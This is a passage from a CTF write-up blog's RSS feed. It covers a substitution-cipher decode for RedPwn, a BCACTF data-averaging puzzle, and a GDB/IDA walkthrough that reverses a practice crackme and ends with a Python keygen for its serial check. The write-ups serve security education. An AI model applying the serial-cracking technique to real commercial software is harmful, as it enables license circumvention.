class="string">u&#x27;R&#x27;</span>: <span class="number">5</span>, <span class="string">u&#x27;U&#x27;</span>: <span class="number">5</span>, <span class="string">u&#x27;)&#x27;</span>: <span class="number">4</span>, <span class="string">u&#x27;(&#x27;</span>: <span class="number">4</span>, <span class="string">u&#x27;B&#x27;</span>: <span class="number">4</span>, <span class="string">u&#x27;\u2154&#x27;</span>: <span class="number">4</span>, <span class="string">u&#x27;M&#x27;</span>: <span class="number">3</span>, <span class="string">u&#x27;N&#x27;</span>: <span class="number">3</span>, <span class="string">u&#x27;W&#x27;</span>: <span class="number">3</span>, <span class="string">u&#x27;;&#x27;</span>: <span class="number">3</span>, <span class="string">u&#x27;\u2014&#x27;</span>: <span class="number">2</span>, <span class="string">u&quot;&#x27;&quot;</span>: <span class="number">2</span>, <span class="string">u&#x27;:&#x27;</span>: <span class="number">2</span>, <span class="string">u&#x27;\u03c0&#x27;</span>: <span class="number">2</span>, <span class="string">u&#x27;H&#x27;</span>: <span class="number">2</span>, <span class="string">u&#x27;1&#x27;</span>: <span class="number">2</span>, <span class="string">u&#x27;0&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;8&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;C&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;F&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;L&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;P&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;Y&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;2&#x27;</span>: <span class="number">1</span>, <span class="string">u&#x27;9&#x27;</span>: <span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p>Now comparing the counter values as it is sorted in the descending order I could replace them in the text with the following python script. </p><p>I started replacing the characters one by one and I used this <a href="https://www.online-toolz.com/tools/text-unicode-entities-convertor.php" target="_blank">tool</a> to convert the unicode values to text online.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">infile = <span class="built_in">open</span>(<span class="string">&#x27;output_final.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = infile.read()</span><br><span class="line"></span><br><span class="line">replacements = &#123;<span class="string">u&#x27;\u064a&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">u&#x27;\u062e&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">u&#x27;\u03b9&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">u&#x27;\u03b2&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,  </span><br><span class="line"><span class="string">u&#x27;\u2153&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">u&#x27;\u2157&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">u&#x27;\u03b7&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">u&#x27;\u0638&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">u&#x27;\u03b8&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,  </span><br><span class="line"><span class="string">u&#x27;\u827e&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,<span class="string">u&#x27;\u03bb&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,<span class="string">u&#x27;\u0631&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,<span class="string">u&#x27;\u03c7&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,<span class="string">u&#x27;\u4f0a&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,  </span><br><span class="line"><span class="string">u&#x27;\u5409&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">u&#x27;\u0634&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,<span class="string">u&#x27;\u03bc&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,<span class="string">u&#x27;\u2158&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">u&#x27;\u03b3&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,  </span><br><span class="line"><span class="string">u&#x27;\u5f00&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">u&#x27;\u0639&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">u&#x27;\u00bd&#x27;</span>:<span class="string">&#x27;x&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">cipher = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join([replacements.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br></pre></td></tr></table></figure><p>Finally I got the decoded text as follows.  </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">OMG WOW NO WAY  </span><br><span class="line">IT&#x27;S UTF8 GARBAGE AMONGST THE REGULAR GARBAGE!   </span><br><span class="line">IT MUST BE A SUBSTITUTION CIPHER!!!!!  </span><br><span class="line">to be honest, i was surprised at the difficultl teams experienced in solving this problem.  </span><br><span class="line">however, i hope anl teams that were stlmied bl it don’t think it was necessarill unfair, πust difficult.  </span><br><span class="line">i think each step in this solution could be catallled bl logical clues, and nothing re⅔uired  </span><br><span class="line">pure trial-and-error. i think the difficultl delta from the rest of pactf might have exacerbated the   </span><br><span class="line">difficulties teams faced: perhaps people were expecting a problem closer to the round 1 hard problems.  </span><br><span class="line">additionalll, it’s a fairll non-standard ctf problem. i’d argue that works to the problem’s advantage,  </span><br><span class="line">and from what i’ve seen people who haven’t done too manl ctfs seemed to like it more, but that’s anecdotal.  </span><br><span class="line">if lou disagree, or want to share anlthing else, feel free to contact me! hope lou enπoled the ctf as a whole!  </span><br><span class="line">also, if lou like problems like this, make sure to check out pactf 2019 in manl months’ time.</span><br><span class="line">    -- nicholasm</span><br><span class="line">keep going.</span><br><span class="line">don&#x27;t be evil.</span><br><span class="line">this challenge is intuitive.</span><br><span class="line">here is a tinl shortened clue to the document lou will need. keep lour head in the cloud.</span><br><span class="line">tinlflaglink</span><br><span class="line">--------------------------------</span><br><span class="line">useless chunks of english text to make fre⅔uencl anallsis easier (ignore below this point):</span><br><span class="line"></span><br><span class="line">** REDACTED **</span><br></pre></td></tr></table></figure><p>One thing to note here is, <strong>y</strong> and <strong>l</strong> are same in many places in the text.  I don’t know maybe the organisers messed it up a bit..<br>Also they didn’t even read the decoded text which contains the string <strong>make sure to check out pactf 2019</strong>.<br>I also had trouble finding the flag as the link given was incomplete.<br>After some tinkering I found the flag on the link : <a href="https://tinyurl.com/tinyflaglink">https://tinyurl.com/tinyflaglink</a>  </p><p>I guessed tinyurl part from the PACTF writeup.   </p><p><a href="/img/redpwn/s2.png" class="gallery-item"><img src="/img/redpwn/s2.png"></a></p><p>And finally we got our intuitive flag. </p><p><a href="https://media.giphy.com/media/3XEgV9kfwLy1i/giphy.gif" class="gallery-item"><img src="https://media.giphy.com/media/3XEgV9kfwLy1i/giphy.gif"></a></p><hr><p>Thanks for Reading this writeup..<br>Subscribe to my Newsletter for more updates regarding CTFs.<br>Also Feedback is always appreciated.<br>It won’t take much time though.    </p><p>And Keep Escalating the Privileges<br>Happy Hacking ;)</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/redpwn/">redpwn</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/redpwngotbamboozled/">redpwngotbamboozled</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/dedication/">dedication</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/skywriting/">skywriting</category>
      
      
      <comments>https://mrt4ntr4.github.io/RedPwn-CTF-Writeups/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Linux Keygenme 1</title>
      <link>https://mrt4ntr4.github.io/Linux-keygenme1/</link>
      <guid>https://mrt4ntr4.github.io/Linux-keygenme1/</guid>
      <pubDate>Thu, 01 Aug 2019 00:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/kgm1/thumb.jpg" title="banner" class="gallery-item"><img src="/img/kgm1/thumb.jpg" alt="banner"></a></p><p>In Today’s post we’ll be solving a basic level crackme which does some basic arithmetic calculations and then later checks our serial-key according to our input.<br>This is gonna be interesting and besides that we’ll also get to learn some basics of GDB and IDA alongside.</p><p>Disclaimer : This post might be a bit longer than I expected it to be but it seems that it was necessary to emphasize a little bit more so that beginners do not get stuck.  </p><hr><h1 id="keyGme"><a href="#keyGme" class="headerlink" title="keyGme"></a>keyGme</h1><h4 id="by-rion"><a href="#by-rion" class="headerlink" title="by rion"></a>by rion</h4><p><a href="https://crackmes.one/crackme/5c268e8333c5d41e58e00654" target="_blank">Download Link</a></p><p><a href="/img/kgm1/6.png" class="gallery-item"><img src="/img/kgm1/6.png"></a>    </p><p>Strings always makes our initial analysing part easy!!<br>We find their references and jump to their usage in the binary.  </p><p><a href="/img/kgm1/1.png" class="gallery-item"><img src="/img/kgm1/1.png"></a>  </p><p>The main function looks similar to most of the crackmes as <strong>$eax</strong> is being compared to 2 and then there is a jump if it is not equal to 2. Basically here 2 is the argc parameter, as we’ve to specify the serial-key in the argument.  </p><p><a href="/img/kgm1/2.png" class="gallery-item"><img src="/img/kgm1/2.png"></a>    </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: ./keyGme [serial-key]</span><br></pre></td></tr></table></figure><p>This message is printed on the console if <strong>eax</strong> is not 2.   </p><p><a href="/img/kgm1/3.png" class="gallery-item"><img src="/img/kgm1/3.png"></a> </p><p>Also our serial-key’s length is then put into the <strong>eax</strong> register which is later compared to 10h (16<sub>10</sub>) </p><p><a href="/img/kgm1/4.png" class="gallery-item"><img src="/img/kgm1/4.png"></a>    </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your key must be 16 characters.</span><br></pre></td></tr></table></figure><p>This message is printed on the console if <strong>eax</strong> is not 16 and our program exits. </p><p><a href="/img/kgm1/5.png" class="gallery-item"><img src="/img/kgm1/5.png"></a>    </p><p>After entering our serial-key of 16 characters, there is a call to a function 8048323.</p><p><a href="/img/kgm1/7.png" class="gallery-item"><img src="/img/kgm1/7.png"></a>    </p><p>We observe that func 8048323 further calls to other functions ie. 80482C1 and 80482F2 and there is a loop.</p><p><a href="/img/kgm1/8.png" class="gallery-item"><img src="/img/kgm1/8.png"></a>    </p><p>The above function ie. 80482C1 checks whether each of our input character is in the range of (41h, 5Ah) ie. (‘A’, ‘Z’).<br>So basically it should be an uppercase alphabet.  </p><p><a href="/img/kgm1/9.png" class="gallery-item"><img src="/img/kgm1/9.png"></a>    </p><p>The latter function checks for the range (30h, 39h) ie. (‘1’, ‘9’) </p><p><a href="/img/kgm1/10.png" class="gallery-item"><img src="/img/kgm1/10.png"></a>    </p><p>And if there is a character other than the ranges specified it breaks the loop and prints out the message.  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Found invalid character!</span><br></pre></td></tr></table></figure><p><a href="/img/kgm1/11.png" class="gallery-item"><img src="/img/kgm1/11.png"></a>   </p><p>If there is no such invalid character then the control is passed to the above func 80483A9.<br>It does the main key “building” function in our program.   </p><p>To understand this crackme a little bit more, we fire up GDB for dynamic analysis. Although, It doesn’t require us to do so, I’m just walking you through a basic tutorial.       </p><p><a href="/img/kgm1/12.png" class="gallery-item"><img src="/img/kgm1/12.png"></a>   </p><p>We can set up a break point on the starting address of the above function and run the program with an input such as “1234ABCD1234ABCD” as we know from our initial analysis that only uppercase letters and numeric digits are valid.  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x80483a9  </span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>Now as we can see in the above screenshot, currently our whole input is in the <strong>ECX</strong> register and <strong>EAX</strong> has the first character .  </p><p><a href="/img/kgm1/13.png" class="gallery-item"><img src="/img/kgm1/13.png"></a>   </p><p>Now we keep on stepping a single instruction using : </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s</span><br></pre></td></tr></table></figure><p><a href="/img/kgm1/14.png" class="gallery-item"><img src="/img/kgm1/14.png"></a>   </p><p>Now when we step through the <strong>sar</strong> instruction, the value in the <strong>EAX</strong> register becomes 0x18 from 0x31.<br>This is because <strong>sar</strong> in assembly means <em>Shift Arithmetic Right</em></p><p>For instance :  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x31</span> &gt;&gt; <span class="number">1</span> = <span class="number">0x18</span></span><br></pre></td></tr></table></figure><p><a href="/img/kgm1/15.png" class="gallery-item"><img src="/img/kgm1/15.png"></a>   </p><p>Stepping further, the value <strong>0xf00</strong> ie. 3840<sub>10</sub> is moved into register <strong>ECX</strong><br>Also after stepping through the <strong>idiv</strong> instruction, value of <strong>EAX</strong> and <strong>EDX</strong> gets changed.<br>This is because the value stored in <strong>EAX</strong> gets divided by value stored in <strong>ECX</strong> and the remainder and quotient is later saved in register <strong>EDX</strong> and <strong>EAX</strong> respectively.  </p><p>Read more about the IDIV instruction <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/idiv" target="_blank">here</a>.</p><p><a href="/img/kgm1/16.png" class="gallery-item"><img src="/img/kgm1/16.png"></a>   </p><p>Afterwards the <strong>EAX</strong> register gets is value back from the stack.<br><a href="/img/kgm1/17.png" class="gallery-item"><img src="/img/kgm1/17.png"></a>   </p><p>And the <strong>add</strong> instruction adds 0xa ie 10<sub>10</sub> to the <strong>EAX</strong> register.  </p><p><a href="/img/kgm1/18.png" class="gallery-item"><img src="/img/kgm1/18.png"></a>   </p><p>So the Value in EAX now becomes 0x22.  </p><p>After the <strong>add</strong> istruction there is a jump.<br>As we can all obviously figure out that this will be a loop to repeat this process for all of the succeeding characters in our input.  </p><p><a href="/img/kgm1/19.png" class="gallery-item"><img src="/img/kgm1/19.png"></a>   </p><p>So the <strong>EAX</strong> value becomes 0x1 ie. the counter variable.    </p><p><a href="/img/kgm1/20.png" class="gallery-item"><img src="/img/kgm1/20.png"></a>   </p><p>But wait, there’s a fish, value of <strong>EAX</strong> also changes to 0xf  !!<br>hmm…</p><p><a href="/img/kgm1/21.png" class="gallery-item"><img src="/img/kgm1/21.png"></a>   </p><p>No Problem, let us continue stepping till the last character is stored in <strong>EAX</strong>.  </p><p><a href="/img/kgm1/22.png" class="gallery-item"><img src="/img/kgm1/22.png"></a>   </p><p>When the loop iterates further through the second character in our input, we find that <strong>EAX</strong> becomes 0x54 and also there was an <strong>add</strong> instruction which adds <strong>EDX</strong> and <strong>EAX</strong>.<br>So, this basically means our previous result is added to our second character’s hex value.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x22</span>(previous) + <span class="number">0x32</span>(current) = <span class="number">0x54</span></span><br></pre></td></tr></table></figure><p><a href="/img/kgm1/23.png" class="gallery-item"><img src="/img/kgm1/23.png"></a>   </p><p>Now the same operation continues with 0x54.<br>ie. </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x54</span> &gt;&gt; <span class="number">1</span> = <span class="number">0x2a</span></span><br></pre></td></tr></table></figure><p><a href="/img/kgm1/24.png" class="gallery-item"><img src="/img/kgm1/24.png"></a>   </p><p>Now when we iterate through our last character of our input, we find that there is a <strong>cmp</strong> instruction which compares <strong>EAX</strong> to <strong>EDX</strong>.</p><p>So Now I get it, the value of <strong>EAX</strong> is always compared to 0xf after each iteration so that if it reaches the 16th character it jumps out of the loop and this cmp instruction is executed.  </p><p><a href="/img/kgm1/25.png" class="gallery-item"><img src="/img/kgm1/25.png"></a> </p><p>I traced back the <strong>cmp</strong> instruction on IDA too.<br>But in our case, the EAX and EDX values are not similar. So our input isn’t right.<br>So I tried entering our last character as ‘T’ as it was stored in <strong>EAX</strong> at last.</p><p><a href="/img/kgm1/26.png" class="gallery-item"><img src="/img/kgm1/26.png"></a>  </p><p>And B00mYa!! We did it.<br>We are presented with the Congratulations message.  </p><p>I wrote a small keygen in python which takes random uppercase letters and numeric digits and crafts a string of length 15, and then later we append our last character to it by doing similar calculations as the program does.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> <span class="built_in">chr</span>(res).isupper():</span><br><span class="line">    letters = string.ascii_uppercase + string.digits</span><br><span class="line">    seedKey = <span class="string">&#x27;&#x27;</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>))</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> seedKey:</span><br><span class="line">        chardec = <span class="built_in">ord</span>(ch)</span><br><span class="line">        res += chardec</span><br><span class="line">        res = res &gt;&gt; <span class="number">1</span></span><br><span class="line">        res = res % <span class="number">0xf00</span></span><br><span class="line">        res += <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line">final_key = seedKey + <span class="built_in">chr</span>(res)</span><br><span class="line"><span class="built_in">print</span> final_key</span><br></pre></td></tr></table></figure><p>Wait x2 !! You’ve to read this too.. LOL</p><p>Make sure to subscribe to the newsletter to learn together with me.<br>Also Comment your feedbacks and share this writeup with your friends.<br>You can also ping me over Twitter <a href="https://twitter.com/MrT4ntr4" target="_blank">@mrT4ntr4</a></p><p>Happy Reversing Gang!!</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/crackmes-one/">crackmes.one</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/Linux/">Linux</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Reversing/">Reversing</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Crackme/">Crackme</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/Tutorial/">Tutorial</category>
      
      
      <comments>https://mrt4ntr4.github.io/Linux-keygenme1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>BCACTF [ LargeData ]</title>
      <link>https://mrt4ntr4.github.io/BCACTF-LargeData-Writeup/</link>
      <guid>https://mrt4ntr4.github.io/BCACTF-LargeData-Writeup/</guid>
      <pubDate>Sat, 15 Jun 2019 23:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/bcactf/thumb.png" title="banner" class="gallery-item"><img src="/img/bcactf/thumb.png" alt="banner"></a></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Sadly the Intro does not begin with this everytime!!<br><del><a href="https://twitter.com/dc1ph3r">BCACTF</a> was a fun ctf competition.</del><br>TBH, BCACTF is a pure example of how a CTF competition should not be held or if it is held, then it should end within a day.<br>Some of the participants were complaining about the quality of the challs on the discord server, and here is a message which explains everything…  </p><p><em>I usually try to stay polite towards organizers because I know that making a CTF is hard. But there are some issues that need to be fixed. Most importantly, every single challenge is trivially easy. I don’t think that’s inherently terrible, although it makes the CTF less enjoyable. I think having a CTF where the goal is maxing quickly is defendable. But that means you can’t release problems midway through the competition, especially if they are just as easy. Doing that completely nullifying every previous challenge. You also need to check that your challenges work. Both three-step-program and bca-store, the challenges released today, were initially broken. By the time you fix your mistake, many people have solved the challenge. So you now reduce the entire competition to seeing how fast people can refresh and submit their solution to a fixed challenge. I think the best course of action is to get rid of the newly released challenges and to release many more future challenges.</em></p><a href="https://media.giphy.com/media/BMA3uhBODE7teL9ISa/giphy-downsized.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/BMA3uhBODE7teL9ISa/giphy-downsized.gif" alt="drawing" width="300"/></a><p>So Obviously we didn’t spent quite a lot of time in this CTF, and our team(<a href="https://twitter.com/dc1ph3r">Dc1ph3R</a>) finished 28th.</p><hr><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p>Only 2-3 challenges were worth a writeup, One of them was large-data and this was my favourite among them.  </p><p><a href="/img/bcactf/challthumb.png" class="gallery-item"><img src="/img/bcactf/challthumb.png"></a></p><blockquote><p>Download <a href="/files/bcactf/bigdata.zip"  target="_blank">bigdata.zip</a></p></blockquote><p>So the Zip file contained 27 folders consisting of 100 files each.<br>As the flag was splitted in many files, so we had to iterate through each and every file in all of the folders.  </p><p>The text in each of the files was something similar to this..<br><a href="/img/bcactf/data.png" class="gallery-item"><img src="/img/bcactf/data.png"></a></p><p>Eww, so much gibberish, We need the flag!! XD</p><p>A starting point was to check for the initials bcactf{ in the files.<br>And obviously look for some pattern that how is the flag encoded or hidden in those files.<br>The Only hint we get is that the flag is composed of 27 characters, So we can conclude that every folder has a single character of the flag in it.  </p><p>To begin with, some of my unsuccessful attempts were as follows :</p><h4 id="First-Idea"><a href="#First-Idea" class="headerlink" title="First Idea"></a>First Idea</h4><p>Count all the no. of symbols in each file and compare that to the ascii value of “bcactf{“ but after trying this on the 3rd file I failed…</p><h4 id="Second-Idea"><a href="#Second-Idea" class="headerlink" title="Second Idea"></a>Second Idea</h4><p>Concatenating all the “.” and “-“ and try to look for some valid morse code in each file.  </p><h3 id="The-Successful-Attempt"><a href="#The-Successful-Attempt" class="headerlink" title="The Successful Attempt"></a>The Successful Attempt</h3><p>The Idea was to sum all of the corresponding Ascii Codes of all characters in each file and take the average. I found that all the files in the first folder always outputted the average as 98 which is the ascii code for ‘b’. Stepping through the second folder I got 99(‘c’). So to get verified I checked the third folder and to my surprise it was outputting 97(‘a’). So It ensures that the flag is dependent on the average of the ascii values of the characters in each file.  </p><p>So I fired up Sublime and wrote some python code to automate it!!<br>Make sure to place it with the folders.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> folder <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">str</span>(file)+<span class="string">&#x27;/&#x27;</span>+<span class="built_in">str</span>(folder),<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            ascii_code=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">for</span> char <span class="keyword">in</span> line:</span><br><span class="line">                    ascii_code += <span class="built_in">ord</span>(char)</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">            avg=ascii_code/count        </span><br><span class="line">            print(<span class="built_in">chr</span>(avg),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p>Catch the output <a href="/files/bcactf/flags.txt"  target="_blank">here</a></p><p>So the text outputs which starts with <strong>bcactf{</strong> were as follows:  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bcactf&#123;crunkh1ng_nnd5_t00t&#125;</span><br><span class="line">bcactf&#123;wsunch1ny_rusi_c00l&#125;</span><br><span class="line">bcactf&#123;orunch1ng_tun5lc00l&#125;</span><br><span class="line">bcactf&#123;crunch1ng_fuk5_c00l&#125;</span><br><span class="line">bcactf&#123;ruuncu1nd_num5_y0fl&#125;</span><br><span class="line">bcactf&#123;itunch1bg_num5_c00l&#125;</span><br><span class="line">bcactf&#123;crunch1ng_num5fc00i&#125;</span><br><span class="line">bcactf&#123;crunch1np_nuz5_p00y&#125;</span><br><span class="line">bcactf&#123;vrunch1ngkcum5hc0sl&#125;</span><br><span class="line">bcactf&#123;cronch1ngnnum5hq00l&#125;</span><br></pre></td></tr></table></figure><p>NOTE : This script can be modified further to only get the text beginning with “bcactf{“.  </p><p>The only meaningful text which could eventually be our flag was <strong>bcactf{crunch1ng_fuk5_c00l}</strong>.   </p><p>But unfortunately it was not the case, the flag came out to be </p><blockquote><p>bcactf{crunch1ng_num5_c00l}</p></blockquote><p>Which could easily be guessed as <strong>‘num5’</strong> occured the most of the times.  </p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>This challenge required an initial foothold in finding how the data is encoded and analysing it with some creative ideas!!<br>At the end large-data had approx 40 solves.<br>The scoreboard freezed with top 8 teams with the same score ie. 6344<br>Below them there were another 13 teams with the same score ie. 6104 </p><p><a href="/img/bcactf/tux_hype.png" class="gallery-item"><img src="/img/bcactf/tux_hype.png"></a></p><p>So you can guess what a CTF it was!! XD  </p><p>Coming up are some writeups from GoogleCTF!!<br>So Make sure to subscribe to the newsletter to learn together with me.<br>Also Comment your feedbacks and share this writeup with your friends.   </p><p>And Keep Escalating the Priveleges Gang!!  </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/bcactf/">bcactf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/forensics/">forensics</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/data/">data</category>
      
      
      <comments>https://mrt4ntr4.github.io/BCACTF-LargeData-Writeup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HSCTF 6 [ ARIA ]</title>
      <link>https://mrt4ntr4.github.io/HSCTF-ARIA-Writeup/</link>
      <guid>https://mrt4ntr4.github.io/HSCTF-ARIA-Writeup/</guid>
      <pubDate>Fri, 07 Jun 2019 23:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
